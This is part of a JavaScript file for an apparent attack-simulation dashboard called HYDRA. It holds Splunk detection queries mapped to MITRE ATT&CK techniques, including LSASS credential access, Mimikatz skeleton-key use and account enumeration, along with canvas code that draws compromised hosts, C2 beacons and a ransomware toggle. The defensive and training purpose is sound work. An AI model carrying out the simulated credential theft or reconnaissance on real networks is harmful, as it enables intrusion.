    'T1574.001': { source: 'Sysmon/EDR', rule: 'DLL loaded from writable or unusual directory by privileged process', splunk: 'index=sysmon EventCode=7 (ImageLoaded="*\\\\Temp\\\\*" OR ImageLoaded="*\\\\Downloads\\\\*" OR ImageLoaded="*\\\\AppData\\\\*") | table _time Image ImageLoaded Signed' },
    'T1098.004': { source: 'Linux Audit', rule: 'Modification of authorized_keys file', splunk: 'index=linux sourcetype=auditd type=PATH name="*authorized_keys*" | table _time hostname exe name' },
    'T1546.003': { source: 'Sysmon/Windows', rule: 'WMI permanent event consumer created (Sysmon EventID 19/20/21)', splunk: 'index=sysmon (EventCode=19 OR EventCode=20 OR EventCode=21) | table _time EventType Operation Consumer Destination' },
    'T1546.015': { source: 'Sysmon/Registry', rule: 'COM CLSID modified in HKCU to point to non-standard DLL', splunk: 'index=sysmon EventCode=13 TargetObject="*\\\\Classes\\\\CLSID*\\\\InProcServer32*" | where NOT match(Details, "C:\\\\Windows\\\\System32") | table _time Image TargetObject Details' },
    'T1556.001': { source: 'AD/Sysmon', rule: 'LSASS memory modification or misc::skeleton execution on DC', splunk: 'index=sysmon EventCode=10 TargetImage="*lsass.exe" host="DC*" | where NOT match(SourceImage, "csrss|services|lsaiso|MsMpEng") | table _time SourceImage GrantedAccess' },
    'T1110': { source: 'Windows Security/Linux auth', rule: 'Multiple failed login attempts from single source (>5 in 5 min)', splunk: 'index=wineventlog EventCode=4625 | bucket _time span=5m | stats count by _time src_ip Account_Name | where count > 5' },
    'T1087': { source: 'Windows Security/Sysmon', rule: 'Account enumeration commands (net user, net group, whoami /all)', splunk: 'index=sysmon EventCode=1 (CommandLine="*net user*" OR CommandLine="*net group*" OR CommandLine="*net localgroup*" OR CommandLine="*whoami /all*") | table _time User Image CommandLine' },
    'T1082': { source: 'Sysmon/EDR', rule: 'System information discovery commands (systeminfo, hostname, ipconfig)', splunk: 'index=sysmon EventCode=1 (Image="*systeminfo*" OR Image="*ipconfig*" OR CommandLine="*cat /etc/*release*" OR CommandLine="*uname -a*") | table _time User Image CommandLine' },
    'T1069': { source: 'Windows Security', rule: 'Permission group enumeration via LDAP or net commands', splunk: 'index=wineventlog EventCode=4661 ObjectType="SAM_GROUP" | stats count by SubjectUserName ObjectName | where count > 5' },
    'T1021.003': { source: 'Windows Security/Sysmon', rule: 'DCOM object instantiation from remote host', splunk: 'index=sysmon EventCode=1 ParentImage="*svchost.exe" ParentCommandLine="*DcomLaunch*" | table _time Image CommandLine User' },
    'T1021.006': { source: 'Windows Security/PowerShell', rule: 'WinRM remote session establishment (Event ID 91/6)', splunk: 'index=wineventlog source="Microsoft-Windows-WinRM/Operational" (EventCode=91 OR EventCode=6) | table _time ComputerName User src_ip' },
    'T1567.002': { source: 'Proxy/CASB', rule: 'Large upload to cloud storage services (S3, Azure Blob, GDrive, Dropbox)', splunk: 'index=proxy (url="*s3.amazonaws.com*" OR url="*blob.core.windows.net*" OR url="*drive.google.com*") http_method=PUT | stats sum(bytes_out) as total by src_ip url | where total > 50000000' },
    'T1550.003': { source: 'Windows Security', rule: 'Kerberos ticket used from unexpected IP or with anomalous SID', splunk: 'index=wineventlog EventCode=4768 | stats values(Client_Address) as ips by Account_Name | where mvcount(ips) > 1' },
    'T1595': { source: 'IDS/Firewall', rule: 'External reconnaissance (port scanning, version probing)', splunk: 'index=firewall action=blocked | stats dc(dest_port) as ports dc(dest_ip) as hosts by src_ip | where ports > 10 OR hosts > 5' },
  };
  return map[mitre] || { source: 'SIEM/EDR', rule: 'Configure detection for MITRE ' + mitre, splunk: '' };
}

// ============================================================================
// CANVAS RENDERER
// ============================================================================
class HydraCanvas {
  constructor(canvas, engine) {
    this.canvas = canvas;
    this.ctx = canvas.getContext('2d');
    this.engine = engine;
    this.offsetX = 0;
    this.offsetY = 0;
    this.scale = 1;
    this.dragNode = null;
    this.dragOff = { x: 0, y: 0 };
    this.hoveredNode = null;
    this.selectedNode = null;
    this.animFrame = null;
    this.pulsePhase = 0;
    this.setupEvents();
  }

  setupEvents() {
    const c = this.canvas;
    let dragging = false, panStart = null;

    c.addEventListener('mousedown', (e) => {
      const rect = c.getBoundingClientRect();
      const mx = (e.clientX - rect.left - this.offsetX) / this.scale;
      const my = (e.clientY - rect.top - this.offsetY) / this.scale;
      const node = this.hitTest(mx, my);
      if (node) {
        this.dragNode = node;
        this.dragOff = { x: mx - node.x, y: my - node.y };
        this.selectedNode = node;
      } else {
        panStart = { x: e.clientX - this.offsetX, y: e.clientY - this.offsetY };
        this.selectedNode = null;
      }
    });

    c.addEventListener('mousemove', (e) => {
      const rect = c.getBoundingClientRect();
      const mx = (e.clientX - rect.left - this.offsetX) / this.scale;
      const my = (e.clientY - rect.top - this.offsetY) / this.scale;
      if (this.dragNode) {
        this.dragNode.x = mx - this.dragOff.x;
        this.dragNode.y = my - this.dragOff.y;
      } else if (panStart) {
        this.offsetX = e.clientX - panStart.x;
        this.offsetY = e.clientY - panStart.y;
      }
      this.hoveredNode = this.hitTest(mx, my);
      c.style.cursor = this.hoveredNode ? 'pointer' : (panStart ? 'grabbing' : 'default');
    });

    c.addEventListener('mouseup', () => { this.dragNode = null; panStart = null; });
    c.addEventListener('dblclick', (e) => {
      const rect = c.getBoundingClientRect();
      const mx = (e.clientX - rect.left - this.offsetX) / this.scale;
      const my = (e.clientY - rect.top - this.offsetY) / this.scale;
      const node = this.hitTest(mx, my);
      if (node) {
        this.scale = 1.5;
        this.offsetX = c.offsetWidth / 2 - node.x * this.scale;
        this.offsetY = c.offsetHeight / 2 - node.y * this.scale;
        this.selectedNode = node;
      }
    });
    c.addEventListener('wheel', (e) => {
      e.preventDefault();
      const d = e.deltaY > 0 ? 0.9 : 1.1;
      this.scale = Math.max(0.3, Math.min(3, this.scale * d));
    }, { passive: false });
  }

  hitTest(mx, my) {
    for (const h of this.engine.hosts) {
      const dx = mx - h.x, dy = my - h.y;
      if (dx * dx + dy * dy < 900) return h;
    }
    return null;
  }

  draw() {
    const ctx = this.ctx, c = this.canvas;
    c.width = c.offsetWidth;
    c.height = c.offsetHeight;
    ctx.clearRect(0, 0, c.width, c.height);
    ctx.save();
    ctx.translate(this.offsetX, this.offsetY);
    ctx.scale(this.scale, this.scale);
    this.pulsePhase = (this.pulsePhase + 0.03) % (Math.PI * 2);

    // Draw segment backgrounds
    var segMap = {};
    this.engine.hosts.forEach(h => {
      var seg = h.segment || 'default';
      if (!segMap[seg]) segMap[seg] = [];
      segMap[seg].push(h);
    });
    var segColors = { perimeter: 'rgba(255,23,68,0.04)', dmz: 'rgba(255,145,0,0.04)', servers: 'rgba(0,229,255,0.04)', workstations: 'rgba(0,230,118,0.04)', ics_field: 'rgba(255,214,0,0.04)', ics_control: 'rgba(213,0,249,0.04)', public: 'rgba(255,145,0,0.04)', private: 'rgba(0,229,255,0.04)', data: 'rgba(0,230,118,0.04)', swift_zone: 'rgba(255,23,68,0.06)' };
    Object.keys(segMap).forEach(seg => {
      var hosts = segMap[seg];
      if (hosts.length < 1) return;
      var minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
      hosts.forEach(h => { minX = Math.min(minX, h.x); minY = Math.min(minY, h.y); maxX = Math.max(maxX, h.x); maxY = Math.max(maxY, h.y); });
      var pad = 50;
      ctx.fillStyle = segColors[seg] || 'rgba(255,255,255,0.03)';
      ctx.fillRect(minX - pad, minY - pad, maxX - minX + pad * 2, maxY - minY + pad * 2);
      ctx.strokeStyle = 'rgba(0,200,255,0.12)';
      ctx.lineWidth = 1.5;
      ctx.setLineDash([6, 4]);
      ctx.strokeRect(minX - pad, minY - pad, maxX - minX + pad * 2, maxY - minY + pad * 2);
      ctx.setLineDash([]);
      ctx.font = 'bold 10px system-ui';
      ctx.fillStyle = 'rgba(0,200,255,0.35)';
      ctx.textAlign = 'left';
      ctx.textBaseline = 'top';
      ctx.fillText(seg.toUpperCase(), minX - pad + 8, minY - pad + 6);
    });

    // Draw connections
    this.engine.connections.forEach(conn => {
      const from = this.engine.getHost(conn.from);
      const to = this.engine.getHost(conn.to);
      if (!from || !to) return;
      ctx.beginPath();
      ctx.moveTo(from.x, from.y);
      ctx.lineTo(to.x, to.y);
      const bothCompromised = from.sessions && from.sessions.length > 0 && to.sessions && to.sessions.length > 0;
      ctx.strokeStyle = bothCompromised ? 'rgba(255,23,68,0.7)' : 'rgba(0,200,255,0.18)';
      ctx.lineWidth = bothCompromised ? 3 : 1.5;
      ctx.stroke();
      // Connection port label
      if (conn.rules && conn.rules[0] !== '*') {
        var mx = (from.x + to.x) / 2, my = (from.y + to.y) / 2;
        ctx.font = '9px system-ui';
        ctx.fillStyle = 'rgba(0,200,255,0.4)';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText(conn.rules.join(','), mx, my - 6);
      }
      // Attack path pulse
      if (bothCompromised) {
        const pulse = (Math.sin(this.pulsePhase) + 1) / 2;
        const px = from.x + (to.x - from.x) * pulse;
        const py = from.y + (to.y - from.y) * pulse;
        ctx.beginPath();
        ctx.arc(px, py, 5, 0, Math.PI * 2);
        ctx.fillStyle = '#ff1744';
        ctx.fill();
        ctx.beginPath();
        ctx.arc(px, py, 10, 0, Math.PI * 2);
        var pulseGrad = ctx.createRadialGradient(px, py, 3, px, py, 10);
        pulseGrad.addColorStop(0, 'rgba(255,23,68,0.4)');
        pulseGrad.addColorStop(1, 'transparent');
        ctx.fillStyle = pulseGrad;
        ctx.fill();
      }
    });

    // Draw nodes
    this.engine.hosts.forEach(h => {
      const color = STATUS_COLORS[h.status] || STATUS_COLORS.unknown;
      const r = 25;
      // Glow for active nodes
      if (h.sessions && h.sessions.length > 0) {
        const glowR = r + 8 + Math.sin(this.pulsePhase * 2) * 4;
        ctx.beginPath();
        ctx.arc(h.x, h.y, glowR, 0, Math.PI * 2);
        ctx.fillStyle = color.replace(')', ',0.15)').replace('rgb', 'rgba').replace('#', '');
        const grad = ctx.createRadialGradient(h.x, h.y, r, h.x, h.y, glowR);
        grad.addColorStop(0, color + '33');
        grad.addColorStop(1, 'transparent');
        ctx.fillStyle = grad;
        ctx.fill();
      }
      // Node circle with gradient fill
      ctx.beginPath();
      ctx.arc(h.x, h.y, r, 0, Math.PI * 2);
      var nodeGrad = ctx.createRadialGradient(h.x - 5, h.y - 5, 2, h.x, h.y, r);
      nodeGrad.addColorStop(0, '#1a2030');
      nodeGrad.addColorStop(1, '#0a0e16');
      ctx.fillStyle = nodeGrad;
      ctx.fill();
      ctx.strokeStyle = color;
      ctx.lineWidth = this.selectedNode === h ? 4 : 2.5;
      ctx.stroke();
      // Subtle outer glow on all nodes
      ctx.beginPath();
      ctx.arc(h.x, h.y, r + 3, 0, Math.PI * 2);
      ctx.strokeStyle = color + '20';
      ctx.lineWidth = 4;
      ctx.stroke();
      // Icon (first 2 chars of role)
      ctx.fillStyle = color;
      ctx.font = 'bold 12px system-ui';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      const icon = h.role.substring(0, 2).toUpperCase();
      ctx.fillText(icon, h.x, h.y);
      // Label
      ctx.font = 'bold 11px system-ui';
      ctx.fillStyle = '#dde';
      ctx.fillText(h.name, h.x, h.y + r + 16);
      ctx.font = '10px monospace';
      ctx.fillStyle = '#6688aa';
      ctx.fillText(h.ip, h.x, h.y + r + 28);
    });

    // Draw C2 beacon lines
    if (this.engine.c2Beacons.length > 0) {
      var c2x = 400, c2y = -40;
      // C2 node
      ctx.beginPath();
      ctx.arc(c2x, c2y, 20, 0, Math.PI * 2);
      ctx.fillStyle = '#0a0e16';
      ctx.fill();
      ctx.strokeStyle = '#ff1744';
      ctx.lineWidth = 2;
      ctx.setLineDash([]);
      ctx.stroke();
      ctx.font = 'bold 9px system-ui';
      ctx.fillStyle = '#ff1744';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText('C2', c2x, c2y);
      ctx.font = '8px system-ui';
      ctx.fillText('ATTACKER', c2x, c2y + 30);
      // Beacon lines
      this.engine.c2Beacons.forEach(function(b) {
        var h = this.engine.getHost(b.hostId);
        if (!h) return;
        var beaconPulse = (Math.sin(this.pulsePhase * 3 + h.x) + 1) / 2;
        ctx.beginPath();
        ctx.setLineDash([6, 4]);
        ctx.moveTo(h.x, h.y - 25);
        ctx.lineTo(c2x, c2y + 20);
        ctx.strokeStyle = 'rgba(255,23,68,' + (0.15 + beaconPulse * 0.25) + ')';
        ctx.lineWidth = 1.5;
        ctx.stroke();
        ctx.setLineDash([]);
        // Beacon dot traveling along the line
        var bpx = h.x + (c2x - h.x) * beaconPulse;
        var bpy = (h.y - 25) + (c2y + 20 - (h.y - 25)) * beaconPulse;
        ctx.beginPath();
        ctx.arc(bpx, bpy, 3, 0, Math.PI * 2);
        ctx.fillStyle = '#ff1744';
        ctx.fill();
      }.bind(this));
    }

    ctx.restore();
    // Status legend (fixed position, not affected by pan/zoom)
    var legendX = 12, legendY = c.height - 110;
    ctx.fillStyle = 'rgba(10,14,22,0.85)';
    ctx.fillRect(legendX, legendY, 120, 100);
    ctx.strokeStyle = 'rgba(255,255,255,0.1)';
    ctx.lineWidth = 1;
    ctx.strokeRect(legendX, legendY, 120, 100);
    ctx.font = 'bold 9px system-ui';
    ctx.fillStyle = '#888';
    ctx.textAlign = 'left';
    ctx.textBaseline = 'top';
    ctx.fillText('STATUS', legendX + 8, legendY + 6);
    var statuses = [['unknown', 'Unknown'], ['discovered', 'Discovered'], ['scanned', 'Scanned'], ['exploited', 'Exploited'], ['persisted', 'Persisted'], ['exfiltrated', 'Exfiltrated']];
    statuses.forEach(function(s, i) {
      var sy = legendY + 20 + i * 13;
      ctx.beginPath();
      ctx.arc(legendX + 14, sy + 4, 4, 0, Math.PI * 2);
      ctx.fillStyle = STATUS_COLORS[s[0]];
      ctx.fill();
      ctx.font = '8px system-ui';
      ctx.fillStyle = '#aaa';
      ctx.textBaseline = 'middle';
      ctx.fillText(s[1], legendX + 24, sy + 4);
    });
    this.animFrame = requestAnimationFrame(() => this.draw());
  }

  start() { this.draw(); }
  stop() { cancelAnimationFrame(this.animFrame); }
}

// ============================================================================
// MAIN RENDER FUNCTION
// ============================================================================
export function renderHydra(main) {
  const engine = new HydraEngine();
  let canvasRenderer = null;
  let logPaused = false;
  let activeTab = 'sim';

  var HY_CSS = '<style>' +
    '.hy-wrap{font-family:"JetBrains Mono",ui-monospace,monospace}' +
    '.hy-header{display:flex;align-items:center;gap:16px;padding:20px 0;border-bottom:2px solid var(--acc);position:relative}' +
    '.hy-header::after{content:"";position:absolute;bottom:-2px;left:0;width:100px;height:2px;background:var(--acc);box-shadow:0 0 12px var(--acc),0 0 30px color-mix(in srgb,var(--acc) 40%,transparent)}' +
    '.hy-title{font-size:1.8rem;font-weight:800;letter-spacing:.12em;color:var(--acc);text-shadow:0 0 20px color-mix(in srgb,var(--acc) 50%,transparent);margin:0}' +
    '.hy-subtitle{color:var(--mut);font-size:.75rem;letter-spacing:.06em;text-transform:uppercase}' +
    '.hy-status-dot{width:8px;height:8px;border-radius:50%;display:inline-block}' +
    '.hy-dot-idle{background:#555}' +
    '.hy-dot-active{background:#00e676;box-shadow:0 0 8px #00e676;animation:hy-pulse 2s ease-in-out infinite}' +
    '.hy-dot-complete{background:var(--acc);box-shadow:0 0 8px var(--acc)}' +
    '@keyframes hy-pulse{0%,100%{opacity:1}50%{opacity:.4}}' +
    '.hy-tabs{display:flex;gap:2px;overflow-x:auto;padding:12px 0 0;border-bottom:none}' +
    '.hy-tab{background:transparent;border:none;border-bottom:2px solid transparent;color:var(--mut);padding:10px 16px;font-size:.72rem;font-weight:600;letter-spacing:.05em;text-transform:uppercase;cursor:pointer;transition:all .2s;font-family:inherit;white-space:nowrap;flex-shrink:0}' +
    '.hy-tab:hover{color:var(--txt);background:rgba(255,255,255,.03)}' +
    '.hy-tab.active{color:var(--acc);border-bottom-color:var(--acc);text-shadow:0 0 8px color-mix(in srgb,var(--acc) 40%,transparent)}' +
    '.hy-panel{background:var(--card);border:1px solid var(--line);border-radius:6px;overflow:hidden}' +
    '.hy-panel-head{padding:12px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.15);font-size:.72rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--mut)}' +
    '.hy-panel-head .hy-accent{color:var(--acc)}' +
    '.hy-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;min-height:520px}' +
    '.hy-controls{display:flex;align-items:center;gap:6px;flex-wrap:wrap;padding:12px 0}' +
    '.hy-select{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:6px 12px;border-radius:3px;font-size:.75rem;font-family:inherit}' +
    '.hy-select:focus{border-color:var(--acc);outline:none;box-shadow:0 0 0 1px var(--acc)}' +
    '.hy-btn{background:transparent;border:1px solid var(--acc);color:var(--acc);padding:6px 14px;font-size:.72rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;border-radius:4px;cursor:pointer;font-family:inherit;transition:all .15s}' +
    '.hy-btn:hover{background:var(--acc);color:var(--bg);box-shadow:0 0 12px color-mix(in srgb,var(--acc) 40%,transparent)}' +
    '.hy-btn:disabled{opacity:.3;cursor:default}.hy-btn:disabled:hover{background:transparent;color:var(--acc);box-shadow:none}' +
    '.hy-btn-ghost{border-color:var(--line);color:var(--mut)}.hy-btn-ghost:hover{border-color:var(--txt);color:var(--txt);background:rgba(255,255,255,.05);box-shadow:none}' +
    '.hy-stat-bar{display:flex;gap:8px;padding:8px 0;flex-wrap:wrap}' +
    '.hy-stat{background:rgba(0,0,0,.2);border:1px solid var(--line);border-radius:6px;padding:12px 20px;min-width:110px}' +
    '.hy-stat-val{font-size:1.3rem;font-weight:700;font-variant-numeric:tabular-nums}' +
    '.hy-stat-label{font-size:.65rem;color:var(--mut);letter-spacing:.04em;text-transform:uppercase;margin-top:2px}' +
    '.hy-log-entry{margin-bottom:2px;border-left:3px solid;padding:6px 10px;cursor:pointer;transition:background .15s;font-size:.7rem;line-height:1.5;border-radius:0 3px 3px 0}' +
    '.hy-log-entry:hover{background:rgba(255,255,255,.05)}' +
    '.hy-log-detail{display:none;color:var(--mut);white-space:pre-wrap;margin-top:4px;padding:8px;background:rgba(0,0,0,.3);border-radius:3px;border:1px solid var(--line);font-size:.68rem}' +
    '.hy-agent-toggle{display:flex;align-items:center;gap:6px;font-size:.7rem;cursor:pointer;padding:4px 8px;border-radius:4px;border:1px solid transparent;transition:all .15s}' +
    '.hy-agent-toggle:hover{border-color:var(--line);background:rgba(255,255,255,.02)}' +
    '.hy-agent-name{font-weight:700;letter-spacing:.03em}' +
    '.hy-node-tooltip{position:absolute;top:8px;right:8px;background:rgba(6,8,14,0.95);border:1px solid var(--acc);border-radius:4px;padding:12px;font-size:.72rem;max-width:280px;backdrop-filter:blur(8px);box-shadow:0 4px 20px rgba(0,0,0,.5);display:none}' +
    '.hy-comm{padding:8px 12px;margin-bottom:4px;border-radius:4px;font-size:.68rem;line-height:1.5;background:rgba(0,0,0,.2);border-left:3px solid}' +
    '.hy-comm-from{font-weight:700;letter-spacing:.03em}' +
    '.hy-comm-arrow{color:var(--mut);margin:0 4px}' +
    '.hy-threat-gauge{position:relative;width:60px;height:60px;border-radius:50%;border:3px solid var(--line);display:flex;align-items:center;justify-content:center;flex-shrink:0}' +
    '.hy-threat-val{font-size:1rem;font-weight:800;font-variant-numeric:tabular-nums}' +
    '.hy-threat-label{font-size:.55rem;color:var(--mut);text-transform:uppercase;letter-spacing:.04em;position:absolute;bottom:-14px;left:50%;transform:translateX(-50%);white-space:nowrap}' +
    '.hy-scanline{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--acc),transparent);opacity:.3;animation:hy-scanline 4s linear infinite;pointer-events:none}' +
    '@keyframes hy-scanline{0%{transform:translateY(0)}100%{transform:translateY(520px)}}' +
    '.hy-apt-card{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:18px;transition:border-color .2s,box-shadow .2s;cursor:default}' +
    '.hy-apt-card:hover{border-color:var(--acc);box-shadow:0 0 16px color-mix(in srgb,var(--acc) 15%,transparent)}' +
    '.hy-apt-name{font-size:1rem;font-weight:700;color:var(--txt);margin-bottom:4px}' +
    '.hy-apt-nation{font-size:.7rem;color:var(--acc);letter-spacing:.04em;text-transform:uppercase}' +
    '.hy-apt-desc{font-size:.75rem;color:var(--mut);margin:8px 0;line-height:1.5}' +
    '.hy-stealth-bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-top:4px}' +
    '.hy-stealth-fill{height:100%;border-radius:2px;transition:width .3s}' +
    '@media(max-width:800px){.hy-grid{grid-template-columns:1fr}}' +
    '</style>';

  function getThreatColor(score) {
    if (score < 20) return '#00e676';
    if (score < 40) return '#ffd600';
    if (score < 60) return '#ff9100';
    if (score < 80) return '#ff1744';
    return '#d50000';
  }

  function renderUI() {
    var dotClass = engine.running ? 'hy-dot-active' : (engine.tick > 0 ? 'hy-dot-complete' : 'hy-dot-idle');
    var tColor = getThreatColor(engine.threatScore);
    main.innerHTML = HY_CSS +
      '<div class="hy-wrap">' +
        '<div class="hy-header">' +
          '<h1 class="hy-title">HYDRA</h1>' +
          '<span class="hy-subtitle">Heuristic Yielding Dynamic Recon &amp; Attack</span>' +
          '<span style="flex:1"></span>' +
          '<div class="hy-threat-gauge" style="border-color:' + tColor + '">' +
            '<span class="hy-threat-val" style="color:' + tColor + '">' + engine.threatScore + '</span>' +
            '<span class="hy-threat-label">THREAT</span>' +
          '</div>' +
          '<span class="hy-status-dot ' + dotClass + '"></span>' +
        '</div>' +
        '<div class="hy-tabs">' +
          '<button class="hy-tab' + (activeTab === 'sim' ? ' active' : '') + '" data-tab="sim">Operations</button>' +
          '<button class="hy-tab' + (activeTab === 'defense' ? ' active' : '') + '" data-tab="defense">Defense</button>' +
          '<button class="hy-tab' + (activeTab === 'report' ? ' active' : '') + '" data-tab="report">Report</button>' +
          '<button class="hy-tab' + (activeTab === 'mitre' ? ' active' : '') + '" data-tab="mitre">ATT&amp;CK</button>' +
          '<button class="hy-tab' + (activeTab === 'whatif' ? ' active' : '') + '" data-tab="whatif">What-If</button>' +
          '<button class="hy-tab' + (activeTab === 'adversary' ? ' active' : '') + '" data-tab="adversary">Adversary</button>' +
          '<button class="hy-tab' + (activeTab === 'editor' ? ' active' : '') + '" data-tab="editor">Editor</button>' +
          '<button class="hy-tab' + (activeTab === 'scoring' ? ' active' : '') + '" data-tab="scoring">Scoring</button>' +
          '<button class="hy-tab' + (activeTab === 'timeline' ? ' active' : '') + '" data-tab="timeline">Timeline</button>' +
          '<button class="hy-tab' + (activeTab === 'pivotmap' ? ' active' : '') + '" data-tab="pivotmap">Pivot Map</button>' +
          '<button class="hy-tab' + (activeTab === 'detections' ? ' active' : '') + '" data-tab="detections">Detections</button>' +
        '</div>' +
        '<div id="hydra-content" style="margin-top:12px"></div>' +
      '</div>';

    main.querySelector('.hy-tabs').onclick = (e) => {
      const b = e.target.closest('.hy-tab');
      if (!b) return;
      activeTab = b.dataset.tab;
      renderUI();
    };

    const content = main.querySelector('#hydra-content');
    if (activeTab === 'sim') renderSimTab(content);
    else if (activeTab === 'defense') renderDefenseTab(content);
    else if (activeTab === 'report') renderReportTab(content);
    else if (activeTab === 'mitre') renderMitreTab(content);
    else if (activeTab === 'whatif') renderWhatIfTab(content);
    else if (activeTab === 'adversary') renderAdversaryTab(content);
    else if (activeTab === 'editor') renderEditorTab(content);
    else if (activeTab === 'scoring') renderScoringTab(content);
    else if (activeTab === 'timeline') renderTimelineTab(content);
    else if (activeTab === 'pivotmap') renderPivotMapTab(content);
    else if (activeTab === 'detections') renderDetectionsTab(content);
  }

  function renderSimTab(container) {
    container.innerHTML =
      '<div class="hy-controls">' +
        '<label class="hy-subtitle">Environment:</label>' +
        '<select id="hy-env" class="hy-select">' +
          '<option value="corporate">Corporate Network</option>' +
          '<option value="cloud">Cloud (AWS)</option>' +
          '<option value="ics">ICS/SCADA</option>' +
          '<option value="hospital">Hospital</option>' +
          '<option value="financial">Financial</option>' +
        '</select>' +
        '<button class="hy-btn" id="hy-load">Deploy</button>' +
        '<span style="flex:1"></span>' +
        '<button class="hy-btn" id="hy-play" disabled>Execute</button>' +
        '<button class="hy-btn hy-btn-ghost" id="hy-pause" disabled>Pause</button>' +
        '<button class="hy-btn hy-btn-ghost" id="hy-step" disabled>Step</button>' +
        '<button class="hy-btn hy-btn-ghost" id="hy-reset">Reset</button>' +
        '<label class="hy-subtitle" style="margin-left:8px">Speed:</label>' +
        '<select id="hy-speed" class="hy-select">' +
          '<option value="1">1x</option><option value="2">2x</option><option value="5" selected>5x</option><option value="10">10x</option>' +
        '</select>' +
      '</div>' +
      '<div style="display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap" id="hy-agents">' +
        Object.keys(AGENT_COLORS).map(a =>
          '<label class="hy-agent-toggle">' +
            '<input type="checkbox" checked data-agent="' + a + '"> ' +
            '<span class="hy-agent-name" style="color:' + AGENT_COLORS[a] + '">' + a + '</span>' +
          '</label>'
        ).join('') +
        '<label class="hy-agent-toggle" style="border-color:rgba(255,23,68,0.3)">' +
          '<input type="checkbox" id="hy-ransomware"' + (engine.ransomwareEnabled ? ' checked' : '') + '> ' +
          '<span class="hy-agent-name" style="color:#ff1744">RANSOMWARE</span>' +
        '</label>' +
      '</div>' +
      '<div class="hy-grid" id="hy-split">' +
        '<div class="hy-panel" style="position:relative">' +
          '<div class="hy-panel-head"><span class="hy-accent">Network</span> Topology</div>' +
          '<div style="position:relative;height:480px;background:#080c14;border-radius:0 0 6px 6px"><canvas id="hy-canvas" style="width:100%;height:100%;display:block"></canvas><div class="hy-scanline"></div></div>' +
          '<div id="hy-node-info" class="hy-node-tooltip"></div>' +
        '</div>' +
        '<div style="display:flex;flex-direction:column;gap:8px">' +
          '<div class="hy-panel" style="flex:2;display:flex;flex-direction:column">' +
            '<div class="hy-panel-head"><span class="hy-accent">Operation</span> Log<span style="flex:1"></span><span id="hy-tick" style="font-variant-numeric:tabular-nums">T:0</span></div>' +
            '<div id="hy-log" style="flex:1;overflow-y:auto;padding:8px;font-family:inherit;max-height:280px"></div>' +
          '</div>' +
          '<div class="hy-panel" style="flex:1;display:flex;flex-direction:column">' +
            '<div class="hy-panel-head"><span class="hy-accent">Agent</span> Comms</div>' +
            '<div id="hy-comms" style="flex:1;overflow-y:auto;padding:8px;max-height:160px"></div>' +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div class="hy-stat-bar" id="hy-stats"></div>';

    // Wire events
    const loadBtn = container.querySelector('#hy-load');
    const playBtn = container.querySelector('#hy-play');
    const pauseBtn = container.querySelector('#hy-pause');
    const stepBtn = container.querySelector('#hy-step');
    const resetBtn = container.querySelector('#hy-reset');
    const envSel = container.querySelector('#hy-env');
    const speedSel = container.querySelector('#hy-speed');
    const logDiv = container.querySelector('#hy-log');
    const tickSpan = container.querySelector('#hy-tick');
    const statsDiv = container.querySelector('#hy-stats');
    const nodeInfo = container.querySelector('#hy-node-info');
    const canvasEl = container.querySelector('#hy-canvas');
    const commsDiv = container.querySelector('#hy-comms');

    // Agent toggles
    container.querySelector('#hy-agents').addEventListener('change', (e) => {
      const cb = e.target;
      if (cb.dataset.agent) engine.agents[cb.dataset.agent] = cb.checked;
      if (cb.id === 'hy-ransomware') engine.ransomwareEnabled = cb.checked;
    });

    function appendLog(entry) {
      var color = AGENT_COLORS[entry.agent] || '#888';
      var div = document.createElement('div');
      div.className = 'hy-log-entry';
      div.style.borderColor = color;
      div.innerHTML = '<span style="color:' + color + '" class="hy-agent-name">[' + esc(entry.agent) + ']</span> ' +
        '<span style="color:var(--mut)">[T' + entry.tick + ']</span> ' +
        esc(entry.msg) +
        (entry.mitre ? ' <span style="color:var(--acc);font-size:.62rem;letter-spacing:.03em">' + esc(entry.mitre) + '</span>' : '') +
        '<div class="hy-log-detail">' + esc(entry.detail) + '</div>';
      div.onclick = function() {
        var d = div.querySelector('.hy-log-detail');
        d.style.display = d.style.display === 'none' ? 'block' : 'none';
      };
      logDiv.appendChild(div);
      if (!logPaused) logDiv.scrollTop = logDiv.scrollHeight;
    }

    function appendComm(entry) {
      var fromColor = AGENT_COLORS[entry.from] || '#888';
      var toColor = AGENT_COLORS[entry.to] || '#888';
      var div = document.createElement('div');
      div.className = 'hy-comm';
      div.style.borderColor = fromColor;
      div.innerHTML = '<span class="hy-comm-from" style="color:' + fromColor + '">' + esc(entry.from) + '</span>' +
        '<span class="hy-comm-arrow">-></span>' +
        '<span class="hy-comm-from" style="color:' + toColor + '">' + esc(entry.to) + '</span> ' +
        '<span style="color:var(--mut)">' + esc(entry.msg) + '</span>';
      commsDiv.appendChild(div);
      commsDiv.scrollTop = commsDiv.scrollHeight;
    }

    logDiv.addEventListener('mouseenter', () => { logPaused = true; });
    logDiv.addEventListener('mouseleave', () => { logPaused = false; });

    function updateStats() {
      tickSpan.textContent = 'T:' + engine.tick;
      var total = engine.hosts.length;
      var comp = engine.hosts.filter(function(h) { return h.sessions.length > 0; }).length;
      var pers = engine.hosts.filter(function(h) { return h.persistence.length > 0; }).length;
      var exf = engine.hosts.filter(function(h) { return h.exfilData.length > 0; }).length;
      var tColor = getThreatColor(engine.threatScore);
      statsDiv.innerHTML =
        stat('Hosts Compromised', comp + '/' + total, comp === total ? '#00e676' : '#ff9100') +
        stat('Credentials', engine.intel.credentials.length + '', '#ffd600') +
        stat('Persistence', pers + '', '#00e676') +
        stat('Exfiltration', exf + '', '#d500f9') +
        stat('Vulns', engine.intel.vulns.length + '', '#ff1744') +
        stat('Threat Level', engine.threatScore + '', tColor);
      var gauge = main.querySelector('.hy-threat-gauge');
      if (gauge) {
